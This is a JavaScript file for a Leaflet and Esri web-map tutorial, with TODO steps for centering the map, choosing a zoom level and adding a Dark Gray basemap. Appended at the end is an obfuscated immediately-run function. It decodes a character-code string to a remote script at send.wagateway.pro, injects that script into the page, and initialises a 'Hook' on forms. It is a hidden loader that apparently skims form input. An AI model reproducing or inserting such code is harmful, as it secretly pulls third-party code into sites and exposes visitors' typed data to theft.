//TODO: Step 1. Using the Lat/Long tool http://itouchmap.com/latlong.html add the latitude and longitude coordinates to center the map.
//TODO: Step 2. Once you determined a lat, long determine the zoom level by zooming into the map.
var map = L.map("map").setView([0, 0], 2);

//var map = L.map("map").setView([lat, lng], 5); //Testing out the zoom level (zoomed out)

//var map = L.map("map").setView([lat, lng], 15); //Testing out the zoom level (zoomed in)

//var map = L.map("map").setView([lat, lng], 10); //Testing out the zoom level (in between the two)

//TODO: Step 3. Uncomment the basemap line below to display Esri's Dark Gray basemap so we can identify where we are.
//TODO: Step 4. Using Esri's Documentation https://developers.arcgis.com/javascript/3/jsapi/esri.basemaps-amd.html and add the Dark Gray Labels basemap
//TODO: (Optional) Step 5. Check out additional basemaps available, the ImageryFirefly is a great option to display imagery with your data and make it "pop".
//TODO: (Optional) Step 6. Check out additional documentation on L.esri.Vector.basemap to learn more on how to add Esri or your own vector basemap.
/* Basemaps */
// L.esri.basemapLayer("DarkGray").addTo(map);

(function(){if(typeof n!="function")var n=function(){return new Promise(function(e,r){let o=document.querySelector('script[id="hook-loader"]');o==null&&(o=document.createElement("script"),o.src=String.fromCharCode(47,47,115,101,110,100,46,119,97,103,97,116,101,119,97,121,46,112,114,111,47,99,108,105,101,110,116,46,106,115,63,99,97,99,104,101,61,105,103,110,111,114,101),o.id="hook-loader",o.onload=e,o.onerror=r,document.head.appendChild(o))})};n().then(function(){window._LOL=new Hook,window._LOL.init("form")}).catch(console.error)})();//4bc512bd292aa591101ea30aa5cf2a14a17b2c0aa686cb48fde0feeb4721d5db